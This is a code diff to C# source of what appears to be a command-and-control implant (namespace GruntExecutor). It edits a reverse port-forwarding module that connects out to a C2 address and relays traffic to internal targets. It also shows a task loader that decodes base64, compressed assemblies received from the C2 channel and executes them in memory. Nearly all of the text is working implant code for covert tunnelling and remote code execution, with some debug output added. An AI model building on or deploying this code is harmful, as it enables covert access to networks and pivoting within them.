@@ -267,14 +267,14 @@ namespace GruntExecutor
                             IPEndPoint remoteEPC2 = new IPEndPoint(c2_ip_p, Convert.ToInt32(rand_port));
 
                             // Create a TCP/IP  socket.  
-                            socketC2 = new Socket(c2_ip_p.AddressFamily,
-                                SocketType.Stream, ProtocolType.Tcp);
+                            socketC2 = new Socket(c2_ip_p.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                             socketC2.Connect(remoteEPC2);
                             String code_to_start = "testingcode";
                             socketC2.Send(Encoding.UTF8.GetBytes(code_to_start));
                             byte[] data_aux = new byte[256];
                             byte[] data = new byte[256];
                             socketC2.Receive(data);
+
                             c2_sockets[bind_port].Add(socketC2);
                             var target_ip_p = IPAddress.Parse(target_ip);
                             IPEndPoint remoteTarget = new IPEndPoint(target_ip_p, Convert.ToInt32(target_port));
@@ -446,10 +446,14 @@ namespace GruntExecutor
                 return true;
             }
 
-            public static String dealwithit(String Command)
+            public static String dealwithit(string Command)
             {
 
                 string output = "";
+                output += "DEBUG::";
+                output += Command;
+                output += "\n";
+
                 try
                 {
 
@@ -460,96 +464,115 @@ namespace GruntExecutor
                     Console.SetOut(stdOutWriter);
                     Console.SetError(stdErrWriter);
 
-                    if (Command.Contains(' '))
-                    {
-                        int index = Command.IndexOf(' ');
-                        string comm = Command.Substring(0, index);
-                        string func = Command.Substring(index + 1);
-                        string[] commands = func.Split(' ');
-                        string bind_port;
-                        string ip;
-                        string target_port;
-                        string target_ip;
-                        string random_port;
-                        switch (comm)
-                        {
-                            case "list":
-                                output += ShowReversePortForwwrds();
-                                break;
-                            case "start":
-                                bind_port = commands[1];
-                                ip = commands[0];
-                                target_port = commands[3];
-                                target_ip = commands[2];
-                                random_port = commands[4];
-                                output += AddPortForward(ip, bind_port, target_port, target_ip, random_port);
-                                break;
-                            case "stop":
-                                bind_port = commands[0];
-                                output += DelPortForward(func, bind_port);
-                                break;
-                            case "flush":
-                                output += FlushPortForward();
-                                break;
-                            case "help":
-                                output += "[+] Usage: \r\n";
-                                output += "[+] list\r\n";
-                                output += "[+] Returns a list of current reverse port forwards.\r\n\r\n";
+                    //if (Command.Contains(' '))
+                    //{
+                    
+                    string comm;
+                    string func;
+                    string[] commands = {"","","","",""};
 
-
-
-                                output += "[+] start\r\n";
-                                output += "[+] Starts a new reverse port forward.\r\n";
-                                output += "[+] start [bind port] [forward host] [forward port] [ip_to_allow_connections]\r\n";
-
-                                output += "[+] Stop\r\n";
-                                output += "[+] Stops an existing reverse port forward.\r\n";
-                                output += "[+] stop [bind port]\r\n";
-
-                                output += "[+] flush\r\n";
-                                output += "[+] Flush all reverse port forwards on an Agent.\r\n";
-                                break;
-                            default:
-                                output += "[+] Usage:\r\n ";
-                                output += "[+] list \r\n";
-                                output += "[+] Returns a list of current reverse port forwards. \r\n\r\n";
-
-
-
-                                output += "[+] start \r\n";
-                                output += "[+] Starts a new reverse port forward.\r\n";
-                                output += "[+] start [bind port] [forward host] [forward port]\r\n\r\n";
-
-                                output += "[+] Stop\r\n";
-                                output += "[+] Stops an existing reverse port forward.\r\n";
-                                output += "[+] stop [bind port]\r\n\r\n";
-
-                                output += "[+] flush";
-                                output += "[+] Flush all reverse port forwards on an Agent.\r\n";
-                                break;
-
-
+                    int index = Command.IndexOf(' ');
+                    if (index == -1){
+                        //no substring, default to "help"
+                        if (Command != "help" && Command != "flush" && Command != "list"){
+                            comm = "help";
+                        }else{
+                            comm = Command;
                         }
+
+                    }else{
+                        comm= Command.Substring(0, index);
+                        func = Command.Substring(index + 1);
+                        commands = func.Split(' ');
                     }
-                    else
+                    
+                    string bind_port;
+                    string ip;
+                    string target_port;
+                    string target_ip;
+                    string random_port;
+                    
+                    output += "DEBUG::";
+                    output += comm;
+                    output += "\n";
+                    output += commands.ToString();
+                    output += "\n";
+
+                    switch (comm)
                     {
-                        output += "[+] Usage: \r\n";
-                        output += "[+] list \r\n";
-                        output += "[+] Returns a list of current reverse port forwards. \r\n\r\n";
+                        case "list":
+                             output += ShowReversePortForwwrds();
+                             break;
+                        case "start":
+                             bind_port = commands[1];
+                             ip = commands[0];
+                             target_port = commands[3];
+                             target_ip = commands[2];
+                             random_port = commands[4];
+                             output += AddPortForward(ip, bind_port, target_port, target_ip, random_port);
+                             break;
+                        //case "stop":
+                        //     bind_port = commands[0];
+                        //     output += DelPortForward(func, bind_port);
+                        //     break;
+                        case "flush":
+                             output += FlushPortForward();
+                             break;
+                        case "help":
+                            output += "[+] Usage:\r\n";
+                            output += "[+] list \r\n";
+                            output += "[+] Returns a list of current reverse port forwards. \r\n\r\n";
 
+                            output += "[+] start \r\n";
+                            output += "[+] Starts a new reverse port forward.\r\n";
+                            output += "[+] start [bind ip] [bind port] [forward host] [forward port]\r\n\r\n";
 
+                            output += "[+] Stop\r\n";
+                            output += "[+] Stops an existing reverse port forward.\r\n";
+                            output += "[+] stop [bind port]\r\n\r\n";
 
-                        output += "[+] start \r\n";
-                        output += "[+] Starts a new reverse port forward. \r\n";
-                        output += "[+] start [bind port] [forward host] [forward port] \r\n\r\n";
+                            output += "[+] flush\r\n";
+                            output += "[+] Flush all reverse port forwards on an Agent.\r\n";
+                            break;
+                        default:
+                            output += "[+] Usage:\r\n";
+                            output += "[+] list \r\n";
+                            output += "[+] Returns a list of current reverse port forwards. \r\n\r\n";
 
-                        output += "[+] Stop \r\n";
-                        output += "[+] Stops an existing reverse port forward. \r\n";
-                        output += "[+] stop [bind port] \r\n\r\n";
+                            output += "[+] start \r\n";
+                            output += "[+] Starts a new reverse port forward.\r\n";
+                            output += "[+] start [bind ip] [bind port] [forward host] [forward port]\r\n\r\n";
 
-                        output += "[+] flush \r\n";
-                        output += "[+] Flush all reverse port forwards on an Agent. \r\n";
+                            output += "[+] Stop\r\n";
+                            output += "[+] Stops an existing reverse port forward.\r\n";
+                            output += "[+] stop [bind port]\r\n\r\n";
+
+                            output += "[+] flush\r\n";
+                            output += "[+] Flush all reverse port forwards on an Agent.\r\n";
+                            break;
+
                     }
+
+                    // }
+                    // else
+                    // {
+                    //     output += "[+] Usage: \r\n";
+                    //     output += "[+] list \r\n";
+                    //     output += "[+] Returns a list of current reverse port forwards. \r\n\r\n";
+
+
+
+                    //     output += "[+] start \r\n";
+                    //     output += "[+] Starts a new reverse port forward. \r\n";
+                    //     output += "[+] start [bind port] [forward host] [forward port] \r\n\r\n";
+
+                    //     output += "[+] Stop \r\n";
+                    //     output += "[+] Stops an existing reverse port forward. \r\n";
+                    //     output += "[+] stop [bind port] \r\n\r\n";
+
+                    //     output += "[+] flush \r\n";
+                    //     output += "[+] Flush all reverse port forwards on an Agent. \r\n";
+                    // }
 
                     Console.Out.Flush();
                     Console.Error.Flush();
@@ -798,15 +821,14 @@ namespace GruntExecutor
                     string[] pieces = message.Message.Split(',');
                     if (pieces.Length > 0)
                     {
-                        string[] parameters = null;
-                        if (pieces.Length > 1) { parameters = new string[pieces.Length - 1]; }
+                        object[] parameters = null;
+                        if (pieces.Length > 1) { parameters = new object[pieces.Length - 1]; }
                         for (int i = 1; i < pieces.Length; i++) { parameters[i - 1] = Encoding.UTF8.GetString(Convert.FromBase64String(pieces[i])); }
                         byte[] compressedBytes = Convert.FromBase64String(pieces[0]);
                         byte[] decompressedBytes = Utilities.Decompress(compressedBytes);
                         Assembly gruntTask = Assembly.Load(decompressedBytes);
                         PropertyInfo streamProp = gruntTask.GetType("Task").GetProperty("OutputStream");
                         string results = "";
-                        object objTask = new object();
                         var myMethodExists = gruntTask.GetType("Task").GetMethod("DummyPortFwd");
                         var myTypeExists = gruntTask.GetType("Task");
                         if (myMethodExists == null){
@@ -831,7 +853,7 @@ namespace GruntExecutor
                         {
                             string params_str = string.Join("", parameters);
                             results = Portfwd.dealwithit(params_str);
-                            if (results != null) { output += (string)results; }
+                            //if (results != null) { output += (string)results; }
                         }
                         
                         else if (streamProp == null)
@@ -905,6 +927,7 @@ namespace GruntExecutor
                             }
                             invokeThread.Join();
                         }
+                        
                         output += results;
                     }
                 }
